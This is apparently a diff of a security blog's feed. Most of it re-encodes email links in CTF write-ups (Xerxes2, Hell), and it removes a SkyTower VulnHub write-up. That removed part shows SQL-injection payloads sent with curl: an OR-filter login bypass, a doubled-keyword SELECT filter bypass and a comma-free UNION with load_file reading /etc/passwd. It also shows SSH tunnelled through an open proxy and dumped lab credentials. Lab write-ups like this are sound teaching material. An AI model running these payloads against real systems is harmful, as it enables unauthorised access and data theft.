+0x8049a48 <a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#x70;&#114;&#x69;&#110;&#116;&#102;&#x40;&#103;&#x6f;&#x74;&#46;&#x70;&#x6c;&#x74;">&#x70;&#114;&#105;&#x6e;&#116;&#x66;&#64;&#103;&#x6f;&#x74;&#46;&#x70;&#x6c;&#116;</a>: 0x00002000
 (gdb)
 ```</p>
 
@@ -804,7 +1943,7 @@ Start it from the beginning? (y or n) y</p>
 H�J�                                                                                                                                                                                                              3
 Breakpoint 1, 0x080486eb in main ()
 (gdb) x/x 0x08049a48
-0x8049a48 <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#112;&#x72;&#x69;&#110;&#116;&#x66;&#64;&#103;&#x6f;&#116;&#46;&#x70;&#108;&#x74;">&#x70;&#x72;&#x69;&#x6e;&#x74;&#102;&#64;&#103;&#x6f;&#x74;&#x2e;&#112;&#108;&#x74;</a>: 0x20042004
+0x8049a48 <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#58;&#x70;&#114;&#x69;&#x6e;&#x74;&#x66;&#x40;&#x67;&#111;&#116;&#46;&#112;&#x6c;&#116;">&#x70;&#114;&#105;&#x6e;&#116;&#x66;&#x40;&#x67;&#x6f;&#116;&#46;&#112;&#108;&#116;</a>: 0x20042004
 (gdb)
 ```</p>
 
@@ -822,7 +1961,7 @@ Start it from the beginning? (y or n) y</p>
 H�J�                                                                                                                                                                                                             <br/>
 Breakpoint 1, 0x080486eb in main ()
 (gdb) x/x 0x08049a48
-0x8049a48 <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#111;&#58;&#112;&#x72;&#105;&#x6e;&#116;&#102;&#x40;&#x67;&#111;&#x74;&#x2e;&#112;&#108;&#116;">&#x70;&#114;&#105;&#x6e;&#116;&#x66;&#64;&#103;&#x6f;&#x74;&#x2e;&#112;&#108;&#x74;</a>: 0x40062000
+0x8049a48 <a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#x3a;&#112;&#x72;&#x69;&#x6e;&#x74;&#x66;&#x40;&#103;&#111;&#x74;&#x2e;&#x70;&#108;&#116;">&#x70;&#x72;&#105;&#110;&#116;&#102;&#x40;&#103;&#111;&#x74;&#x2e;&#x70;&#108;&#x74;</a>: 0x40062000
 (gdb)
 ```</p>
 
@@ -975,7 +2114,7 @@ polito@xerxes2:~$
 <p>Extracting <code>korenchkin.tar</code> revealed a SSH key pair, so to become korenchkin I copied the SSH key to my Kali VM and SSH in as <code>korenchkin</code>:</p>
 
 <p>```bash SSH as korenchkin
-root@kali:~# ssh -i korenchkin.key <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#x6b;&#x6f;&#x72;&#101;&#110;&#99;&#x68;&#107;&#105;&#x6e;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#54;&#x38;&#46;&#x35;&#54;&#46;&#49;&#48;&#x32;">&#x6b;&#x6f;&#114;&#x65;&#x6e;&#99;&#104;&#107;&#x69;&#x6e;&#64;&#49;&#57;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#x35;&#54;&#46;&#x31;&#x30;&#50;</a></p>
+root@kali:~# ssh -i korenchkin.key <a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#111;&#58;&#107;&#x6f;&#114;&#101;&#110;&#x63;&#x68;&#x6b;&#x69;&#110;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#x35;&#x36;&#x2e;&#x31;&#x30;&#x32;">&#x6b;&#111;&#114;&#101;&#110;&#x63;&#104;&#x6b;&#x69;&#x6e;&#x40;&#49;&#57;&#50;&#46;&#49;&#54;&#x38;&#46;&#x35;&#54;&#46;&#49;&#48;&#x32;</a></p>
 
 <p>Welcome to xerxes2.</p>
 
@@ -1179,7 +2318,7 @@ make[1]: Leaving directory</code>/usr/src/linux-headers-3.2.0-4-686-pae'</p>
 <p>korenchkin@xerxes2:~/kern$ logout
 Connection to 192.168.56.102 closed.</p>
 
-<p>root@kali:~/Desktop/xeres2# ssh <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#x72;&#x6f;&#x6f;&#116;&#x40;&#49;&#x39;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#x35;&#x36;&#x2e;&#x31;&#x30;&#x32;">&#x72;&#x6f;&#111;&#x74;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#46;&#53;&#54;&#x2e;&#49;&#48;&#50;</a> -i delacroix</p>
+<p>root@kali:~/Desktop/xeres2# ssh <a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#x3a;&#x72;&#111;&#x6f;&#x74;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#46;&#53;&#54;&#x2e;&#x31;&#48;&#50;">&#114;&#x6f;&#111;&#116;&#64;&#49;&#57;&#50;&#46;&#x31;&#54;&#56;&#46;&#53;&#x36;&#x2e;&#x31;&#x30;&#50;</a> -i delacroix</p>
 
 <p>Welcome to xerxes2.</p>
 
@@ -1876,8 +3015,8 @@ mysql_connect("127.0.0.1", "www-data", "website") or die("Server Error");
 <p>The comment was quite helpful along with all the mentions of Jack on the website, along with the <code>/etc/passwd</code> revealing a <code>jack</code> user, I tried these credentials on a SSH session:</p>
 
 <p>```bash ssh as jack
-root@kali:~# ssh <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#106;&#x61;&#99;&#x6b;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#53;&#x36;&#x2e;&#x31;&#x30;&#50;">&#x6a;&#97;&#99;&#x6b;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#53;&#x36;&#x2e;&#49;&#x30;&#x32;</a>
-<a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x6a;&#97;&#99;&#107;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#53;&#x36;&#x2e;&#x31;&#x30;&#x32;">&#106;&#x61;&#99;&#x6b;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#53;&#54;&#46;&#x31;&#x30;&#x32;</a>&rsquo;s password:
+root@kali:~# ssh <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#111;&#58;&#106;&#x61;&#x63;&#107;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#56;&#46;&#53;&#54;&#46;&#49;&#48;&#50;">&#106;&#97;&#x63;&#x6b;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#46;&#53;&#x36;&#46;&#x31;&#48;&#50;</a>
+<a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x6a;&#x61;&#99;&#x6b;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#54;&#56;&#x2e;&#53;&#54;&#46;&#x31;&#48;&#50;">&#106;&#97;&#x63;&#x6b;&#64;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#x35;&#x36;&#x2e;&#49;&#x30;&#50;</a>&rsquo;s password:
 Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686</p>
 
 <p>The programs included with the Debian GNU/Linux system are free software;
@@ -2050,7 +3189,7 @@ gpg:   secret keys imported: 1
 $ gpg /var/mail/jack/received/message.eml</p>
 
 <p>You need a passphrase to unlock the secret key for
-user: &ldquo;<a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#x6a;&#x61;&#99;&#x6b;&#x40;&#99;&#111;&#x77;&#x6c;&#111;&#118;&#101;&#x72;&#115;&#x2e;&#x63;&#x6f;&#x6d;">&#106;&#x61;&#99;&#x6b;&#x40;&#x63;&#111;&#x77;&#108;&#x6f;&#x76;&#x65;&#x72;&#x73;&#46;&#x63;&#111;&#x6d;</a>&rdquo;</p>
+user: &ldquo;<a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x6a;&#x61;&#x63;&#x6b;&#x40;&#x63;&#111;&#x77;&#108;&#111;&#118;&#101;&#114;&#115;&#46;&#99;&#x6f;&#109;">&#x6a;&#97;&#x63;&#x6b;&#x40;&#x63;&#111;&#x77;&#x6c;&#111;&#118;&#x65;&#x72;&#115;&#46;&#99;&#x6f;&#109;</a>&rdquo;</p>
 
 <h1>used the password g0tmi1k69 found in the MySQL database</h1>
 
@@ -2075,8 +3214,8 @@ Ok Jack. I&rsquo;ve created the account &lsquo;milk_4_life&rsquo; as per your re
 <p>So, lets ssh in as <code>milk_4_life</code>&hellip;</p>
 
 <p>```bash SSH as milk_4_life
-root@kali:~# ssh <a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#58;&#109;&#105;&#x6c;&#x6b;&#95;&#x34;&#x5f;&#x6c;&#x69;&#102;&#101;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#53;&#x36;&#46;&#49;&#x30;&#50;">&#109;&#105;&#108;&#x6b;&#95;&#52;&#x5f;&#108;&#105;&#x66;&#x65;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x35;&#54;&#x2e;&#x31;&#48;&#50;</a>
-<a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#x3a;&#109;&#x69;&#108;&#x6b;&#x5f;&#52;&#x5f;&#108;&#x69;&#102;&#x65;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#53;&#54;&#46;&#49;&#48;&#50;">&#109;&#x69;&#108;&#x6b;&#95;&#52;&#95;&#108;&#x69;&#x66;&#101;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#x35;&#54;&#x2e;&#49;&#48;&#x32;</a>&rsquo;s password:
+root@kali:~# ssh <a href="&#109;&#x61;&#x69;&#108;&#116;&#x6f;&#58;&#109;&#x69;&#x6c;&#107;&#95;&#x34;&#x5f;&#108;&#105;&#x66;&#101;&#x40;&#x31;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#53;&#x36;&#x2e;&#49;&#x30;&#50;">&#x6d;&#105;&#108;&#107;&#95;&#x34;&#95;&#x6c;&#x69;&#102;&#101;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#x35;&#x36;&#x2e;&#49;&#x30;&#x32;</a>
+<a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x6d;&#105;&#x6c;&#107;&#95;&#x34;&#x5f;&#108;&#x69;&#102;&#x65;&#64;&#49;&#57;&#50;&#46;&#49;&#x36;&#x38;&#46;&#53;&#x36;&#x2e;&#x31;&#48;&#x32;">&#x6d;&#x69;&#x6c;&#x6b;&#95;&#52;&#x5f;&#108;&#105;&#x66;&#x65;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x35;&#54;&#x2e;&#49;&#48;&#x32;</a>&rsquo;s password:
 Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686</p>
 
 <p>The programs included with the Debian GNU/Linux system are free software;
@@ -2277,7 +3416,7 @@ $ /bin/chmod 600 authorized_keys
 <p>Now we can SSH into the VM as <code>george</code></p>
 
 <p>```bash SSH Access as george
-root@kali:~# ssh <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#x3a;&#103;&#x65;&#x6f;&#x72;&#103;&#101;&#64;&#x31;&#57;&#x32;&#x2e;&#49;&#54;&#x38;&#46;&#x35;&#x36;&#46;&#49;&#48;&#x32;">&#103;&#101;&#x6f;&#114;&#x67;&#x65;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#x2e;&#x35;&#x36;&#46;&#x31;&#48;&#50;</a> -i id_rsa
+root@kali:~# ssh <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#x3a;&#x67;&#x65;&#x6f;&#114;&#103;&#x65;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#x2e;&#53;&#x36;&#46;&#x31;&#x30;&#x32;">&#x67;&#x65;&#x6f;&#114;&#103;&#101;&#x40;&#49;&#57;&#50;&#46;&#49;&#54;&#56;&#46;&#x35;&#54;&#46;&#49;&#x30;&#x32;</a> -i id_rsa
 Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686</p>
 
 <p>The programs included with the Debian GNU/Linux system are free software;
@@ -2299,8 +3438,8 @@ george@hell:~$
 
 <p>```bash George&rsquo;s Signup Mail
 george@hell:~$ cat /var/mail/george/signup.eml
-From: <a href="&#x6d;&#97;&#x69;&#108;&#116;&#111;&#58;&#97;&#100;&#109;&#x69;&#x6e;&#x40;&#x72;&#111;&#99;&#107;&#x79;&#x6f;&#x75;&#x2e;&#99;&#111;&#109;">&#x61;&#x64;&#109;&#105;&#x6e;&#64;&#114;&#111;&#x63;&#x6b;&#121;&#x6f;&#x75;&#x2e;&#x63;&#111;&#x6d;</a>
-To: <a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#58;&#115;&#x75;&#x70;&#101;&#114;&#95;&#97;&#x64;&#x6d;&#105;&#x6e;&#64;&#x68;&#x65;&#x6c;&#108;&#46;&#x63;&#x6f;&#109;">&#115;&#117;&#112;&#x65;&#x72;&#x5f;&#x61;&#x64;&#109;&#x69;&#x6e;&#64;&#x68;&#101;&#108;&#x6c;&#46;&#x63;&#111;&#109;</a>
+From: <a href="&#x6d;&#97;&#x69;&#108;&#116;&#111;&#58;&#x61;&#100;&#109;&#105;&#x6e;&#x40;&#114;&#111;&#x63;&#x6b;&#121;&#x6f;&#117;&#46;&#x63;&#111;&#109;">&#97;&#x64;&#x6d;&#105;&#x6e;&#64;&#x72;&#111;&#99;&#107;&#x79;&#111;&#117;&#x2e;&#x63;&#111;&#x6d;</a>
+To: <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#115;&#x75;&#112;&#x65;&#114;&#95;&#x61;&#100;&#109;&#105;&#110;&#x40;&#104;&#x65;&#108;&#108;&#x2e;&#x63;&#111;&#109;">&#115;&#x75;&#112;&#101;&#114;&#95;&#97;&#x64;&#109;&#105;&#110;&#x40;&#x68;&#101;&#108;&#x6c;&#x2e;&#x63;&#111;&#x6d;</a>
 Subject: Account Activation
 Date: 13th November 2009</p>
 
@@ -2393,7 +3532,7 @@ george@hell:/media/truecrypt1$
 <p>So, a rsa private key. A wild shot in the dark sais this is the private key for one of the other users as per the <code>/etc/passwd</code>. I saved the key to a file on my Kali Linux box and attempted to SSH in as <code>bazza</code>, specifying the private key to use:</p>
 
 <p>```bash ssh access as Bazza
-root@kali:~# ssh <a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#98;&#x61;&#x7a;&#122;&#x61;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#x38;&#46;&#x35;&#x36;&#x2e;&#x31;&#48;&#50;">&#98;&#x61;&#122;&#122;&#97;&#64;&#49;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#53;&#54;&#x2e;&#49;&#x30;&#50;</a> -i truecrypt_id_rsa
+root@kali:~# ssh <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#x3a;&#x62;&#x61;&#x7a;&#x7a;&#97;&#x40;&#49;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#x35;&#54;&#x2e;&#x31;&#48;&#x32;">&#98;&#x61;&#x7a;&#x7a;&#x61;&#x40;&#49;&#57;&#x32;&#46;&#x31;&#x36;&#56;&#46;&#53;&#54;&#x2e;&#49;&#48;&#x32;</a> -i truecrypt_id_rsa
 Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686</p>
 
 <p>The programs included with the Debian GNU/Linux system are free software;
@@ -2571,298 +3710,6 @@ oj@hell:~$
 <h2>summary</h2>
 
 <p>Hell sure as heck taught me a lot and was one fun experience! Shoutout to <a href="https://twitter.com/@0x42424242">@0x42424242</a> for the time taken to make this VM available.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Climbing the SkyTower]]></title>
-    <link href="http://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/"/>
-    <updated>2014-07-17T18:20:12+02:00</updated>
-    <id>http://leonjza.github.io/blog/2014/07/17/climbing-the-skytower</id>
-    <content type="html"><![CDATA[<h2>foreword</h2>
-
-<p>Recently, at a local Security Conference, <a href="https://twitter.com/telspacesystems">@telspacesystems</a> ran a CTF. It was a classic &lsquo;read /root/flag.txt&rsquo; CTF hosted on a wireless network. Sadly the wifi sucked, a lot, and due to this and a flat battery I was not able to attempt this CTF properly at the con. Nonetheless, the VM was released on <a href="http://vulnhub.com/entry/skytower-1,96/">VulnHub</a>, and was promptly downloaded and loaded into VirtualBox.</p>
-
-<p>In summary, this CTF taught me some interesting things about SQL injection where filters are present. More specifically, commas were filtered out and resulted in the need from some creative thinking :)</p>
-
-<h2>starting off</h2>
-
-<p>The very first thing to do was get the IP assigned by my home router to the VM. Loaded this up into a web browser and saw the skytower web page as per the screenshots in the vulnhub entry. The IP I got was 192.168.137.242.</p>
-
-<p>The home page presented you with a login screen and a 2.5MB &lsquo;background.jpg&rsquo; image. Right in the beginning I was started off on the wrong path. I downloaded this background image and attempted to see if there was anything particularly interesting about it. Sadly, the answer to this question was a loud <em>NOPE</em>. I started dirbuster on the web interface and proceeded with a nmap scan of 192.168.137.242 after which I had to call it a night.</p>
-
-<p>```bash SkyTower Nmap results
-$ nmap &mdash;reason -Pn 192.168.137.242</p>
-
-<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-07-17 18:32 SAST
-Nmap scan report for 192.168.137.242
-Host is up, received user-set (0.0020s latency).
-Not shown: 997 closed ports
-Reason: 997 conn-refused
-PORT     STATE    SERVICE    REASON
-22/tcp   filtered ssh        no-response
-80/tcp   open     http       syn-ack
-3128/tcp open     squid-http syn-ack
-```</p>
-
-<p>Next morning I reviewed the results and continued to poke around.</p>
-
-<h2>learn all you can</h2>
-
-<p>With the information gathered so far, I realized that the SSH (tcp/22) was explicitly filtered, however the squid proxy was open. I tried to telnet and use the CONNECT method to see if I was able to access the SSH service:</p>
-
-<p>```bash SSH Access via open proxy
-$ telnet 192.168.137.242 3128
-Trying 192.168.137.242&hellip;
-Connected to 192.168.137.242.
-Escape character is &lsquo;^]&rsquo;.
-CONNECT 127.0.0.1:22
-HTTP/1.0 200 Connection established</p>
-
-<p>SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u1
-^]
-telnet> quit
-Connection closed.
-```</p>
-
-<p>Great, soooo I can get access to the SSH service of needed. The dirbuster results showed nothing of particular interest, but it was worth a shot anyways. An important thing to note here is that I suspect I maxed out the disk space in the VM due to the access_log growing too big from the dirbust. This caused me numerous headaches and frustrated me quite a bit when I was testing. Anyways&hellip;</p>
-
-<p>The next step was to poke around the web application. I personally really enjoy web hacking so this was probably the most fun of the whole CTF. The web page presented you with a simple form that would POST to <code>login.php</code>. 2 fields were posted: <code>email</code> &amp; <code>password</code></p>
-
-<p>A natural reaction is to try and use a single quote in form fields as a quick and nasty check for potential SQL injection. A login attempt with a username of test and password <code>'</code> resulted in:</p>
-
-<p><code>bash SQLi Reveal
-There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1]
-</code></p>
-
-<p>Classic SQLi! Surprised I continued with simple login bypasses. None that I could think of out of my head appeared to work. Eventually I started to notice that some of the keywords that I was using were not appearing in the error messages. This hinted heavily towards the fact that there may be some form of filtering in place. Eventually, I put the request down in a curl command so that I can work with this slightly easier. To sample the keywords being removed:</p>
-
-<p>`&ldquo;bash SkyTower keyword removal
-$ curl &mdash;data &ldquo;email=foo@bar&amp;password=&lsquo; OR 1=1#&rdquo; <a href="http://192.168.137.242/login.php">http://192.168.137.242/login.php</a>
-There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '11#&rdquo; at line 1]%</p>
-
-<p>$ curl &mdash;data &ldquo;email=foo@bar&amp;password=&lsquo;1 OR 1=1#&rdquo; <a href="http://192.168.137.242/login.php">http://192.168.137.242/login.php</a>
-There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1  11#&rsquo;&lsquo; at line 1]%
-```</p>
-
-<p>Ok, so no <code>OR</code>. Thats ok, we can substitute this easily with <code>||</code>.</p>
-
-<p>```html SkyTower Auth Bypass
-$ curl &mdash;data &ldquo;email=foo@bar&amp;password=&lsquo; || 1=1#&rdquo; <a href="http://192.168.137.242/login.php">http://192.168.137.242/login.php</a>
-<HTML></p>
-
-<pre><code>  &lt;div style="height:100%; width:100%;background-image:url('background.jpg');
-                            background-size:100%;
-                            background-position:50% 50%;
-                            background-repeat:no-repeat;"&gt;
-  &lt;div style="
-    padding-right:8px;
-          padding-left:10px;
-    padding-top: 10px;
-          padding-bottom: 10px;
-              background-color:white;
-              border-color: #000000;
-              border-width: 5px;
-              border-style: solid;
-              width: 400px;
-              height:430px;
-              position:absolute;
-              top:50%;
-              left:50%;
-              margin-top:-215px; /* this is half the height of your div*/
-              margin-left:-200px;
-                            "&gt;
-</code></pre>
-
-<p>   <br><strong><font size=4>Welcome <a href="&#x6d;&#97;&#105;&#108;&#116;&#x6f;&#x3a;&#x6a;&#111;&#x68;&#x6e;&#64;&#115;&#x6b;&#121;&#x74;&#101;&#x63;&#104;&#46;&#x63;&#x6f;&#109;">&#106;&#111;&#104;&#110;&#x40;&#115;&#107;&#x79;&#x74;&#101;&#x63;&#x68;&#46;&#99;&#111;&#x6d;</a></font><br /> </br></strong>As you may know, SkyTech has ceased all international operations.<br><br> To all our long term employees, we wish to convey our thanks for your dedication and hard work.<br><br><strong>Unfortunately, all international contracts, including yours have been terminated.</strong><br><br> The remainder of your contract and retirement fund, <strong>$2</strong> ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.<br><br><strong>Username: john</strong><br><strong>Password: hereisjohn</strong> <br><br> We wish you the best of luck in your future endeavors. <br> </div> </div></HTML>%
-```</p>
-
-<p>And success. We have made some progress :D Little did I know that I don&rsquo;t actually completely understand the progress made yet, but just keep this in mind :)</p>
-
-<h2>climbing the tower and faling hard</h2>
-
-<p>From the auth bypass results, we can see specific mention for users to SSH into the server. This particular user has a username <code>john</code> and a password <code>hereisjohn</code>. So lets try this.
-I setup my <code>proxychains</code> install to use the http proxy available on the server (<code>http 192.168.137.242 3128</code>) and opened a SSH session through it:</p>
-
-<p>```bash SSH via Squid Proxy
-$ proxychains4 ssh <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#x6a;&#x6f;&#x68;&#x6e;&#x40;&#49;&#x32;&#x37;&#46;&#x30;&#x2e;&#48;&#x2e;&#x31;">&#106;&#111;&#104;&#110;&#64;&#x31;&#50;&#55;&#46;&#x30;&#x2e;&#48;&#x2e;&#x31;</a>
-[snip]
-[proxychains] Strict chain  &hellip;  192.168.137.242:3128  &hellip;  127.0.0.1:22  &hellip;  OK
-<a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#x3a;&#106;&#111;&#104;&#x6e;&#64;&#49;&#x32;&#55;&#x2e;&#48;&#x2e;&#x30;&#x2e;&#x31;">&#x6a;&#111;&#104;&#110;&#64;&#x31;&#x32;&#55;&#x2e;&#48;&#x2e;&#48;&#x2e;&#x31;</a>&rsquo;s password:
-Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64</p>
-
-<p>The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.</p>
-
-<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Thu Jul 17 12:54:32 2014 from localhost</p>
-
-<p>Funds have been withdrawn
-Connection to 127.0.0.1 closed.
-$
-```</p>
-
-<p>&hellip; ok. So we get a session, and are told <em>Funds have been withdrawn</em>, and get the connection closed. Not exactly what I hoped for. Thinking what could cause this behavior, my mind went on to things like a custom shell, <code>.bashrc</code> files (assuming the user has bash a a shell) etc. So, I figured there may be more users on the system and I should try get those credentials too. After all, we have a working SQL injection point.</p>
-
-<h2>more sql injection</h2>
-
-<p>So back to the SQLi point it was. Taking a wild guess, I assumed there is a <code>users</code> table, and the table will have a primary key of <code>id</code>. So, <code>john</code> may have id 1, and a next user have id 2. So I modified the query slightly:</p>
-
-<p><code>bash SkyTower = filter
-$ curl --data "email=foo@bar&amp;password=' || id=1#" http://192.168.137.242/login.php
-There was an error running the query [Unknown column 'id1' in 'where clause']%
-</code></p>
-
-<p>Well I definitely didn&rsquo;t ask for the column <code>id1</code>, but from this again it was apparent that <code>=</code> was filtered along with <code>OR</code>. :| Ok, so we change the payload again:</p>
-
-<p>```bash SkyTower user enum
-$ curl &mdash;data &ldquo;email=foo@bar&amp;password=&lsquo; || id > 1#&rdquo; <a href="http://192.168.137.242/login.php">http://192.168.137.242/login.php</a>
-[snip]</p>
-
-<br><strong><font size=4>Welcome sara@skytech.com</font><br /> </br></strong>As you may know, SkyTech has ceased all international operations.<br><br> To all our long term employees, we wish to convey our thanks for your dedication and hard work.<br><br><strong>Unfortunately, all international contracts, including yours have been terminated.</strong><br><br> The remainder of your contract and retirement fund, <strong>$2</strong> ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.<br><br><strong>Username: sara</strong><br><strong>Password: ihatethisjob</strong> <br><br> We wish you the best of luck in your future endeavors. <br> </div> </div></HTML>%
-
-
-<p>```</p>
-
-<p>Yay, my guess on the <code>id</code> column was correct, and I now had a second users details. I continued to increment the <code>id</code>, and ended up with 3 accounts:</p>
-
-<ul>
-<li>john:hereisjohn</li>
-<li>sara:ihatethisjob</li>
-<li>william:senseable</li>
-</ul>
-
-
-<p>The users <code>john</code> &amp; <code>sara</code> both had the same behavior when attempting login via SSH, and the user <code>william</code> appears to have had an incorrect password. So, again the results were not exactly what I hoped for.</p>
-
-<h2>more SQL enumeration</h2>
-
-<p>At this stage, I was thinking there must be more information in the database, and I should try and read some files from disk in order to gain a better understanding of what is going on here.</p>
-
-<p>Fast forward a few hours, I discovered that a few more keywords and symbols were filtered. The hardest being the realization that a <code>union select</code> was not working as expected so that I can enumerate the columns. Even though the initial entry on vulnhub mentioned that automated tools would probably not work, I figured in this case that I had a valid SQLi, I could just make use of some SQLMap automagic. Again <em>NOPE</em>. Even with <code>--level 3</code> &amp; <code>--risk 3</code> there was no joy. This is ok.</p>
-
-<p>I studied the error messages in detail, googled&hellip; a lot&hellip; and eventually came across <a href="http://zoczus.blogspot.nl/2013/03/sql-injection-without-comma-char.html">this</a> blogpost, detailing a way to get a union working without the ability to use commas. I should also note that I managed to bypass the <code>SELECT</code> filter by using <code>SELECSELECTT</code> in the payload. Assuming that the filter was a simple <code>str_replace()</code>, this left me with <code>SELECT</code> after the pass.</p>
-
-<p>For the sake of brevity I am not going to detail all of the methods I used in order to exploit the SQLi and get value out of it. I managed to learn that the database user used by the PHP application was root. The query used in <code>login.php</code> returned 3 columns. One particular payload of interest that uses the method in the previously mentioned blog post, was used to start reading files from the servers disk. More specifically, <code>/etc/passwd</code>:</p>
-
-<p>```bash SkyTower File Access
-$ curl &mdash;data &ldquo;email=foo@bar&amp;password=&lsquo; or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt load_file(&rsquo;/etc/password')) as c#&rdquo; <a href="http://192.168.137.242/login.php">http://192.168.137.242/login.php</a>
-[snip]</p>
-
-<br><strong><font size=4>Welcome 222</font><br /> </br></strong>As you may know, SkyTech has ceased all international operations.<br><br> To all our long term employees, we wish to convey our thanks for your dedication and hard work.<br><br><strong>Unfortunately, all international contracts, including yours have been terminated.</strong><br><br> The remainder of your contract and retirement fund, <strong>$2</strong> ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.<br><br><strong>Username: 222</strong><br><strong>Password: root:x:0:0:root:/root:/bin/bash
-
-
-<p>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
-bin:x:2:2:bin:/bin:/bin/sh
-sys:x:3:3:sys:/dev:/bin/sh
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/bin/sh
-man:x:6:12:man:/var/cache/man:/bin/sh
-lp:x:7:7:lp:/var/spool/lpd:/bin/sh
-mail:x:8:8:mail:/var/mail:/bin/sh
-<a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh</a>
-uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
-proxy:x:13:13:proxy:/bin:/bin/sh
-www-data:x:33:33:www-data:/var/www:/bin/sh
-backup:x:34:34:backup:/var/backups:/bin/sh
-list:x:38:38:Mailing List Manager:/var/list:/bin/sh
-irc:x:39:39:ircd:/var/run/ircd:/bin/sh
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
-nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
-libuuid:x:100:101::/var/lib/libuuid:/bin/sh
-sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
-mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
-john:x:1000:1000:john,,,:/home/john:/bin/bash
-sara:x:1001:1001:,,,:/home/sara:/bin/bash
-william:x:1002:1002:,,,:/home/william:/bin/bash
-</strong> <br><br> We wish you the best of luck in your future endeavors. <br> </div> </div></HTML>
-```</p>
-
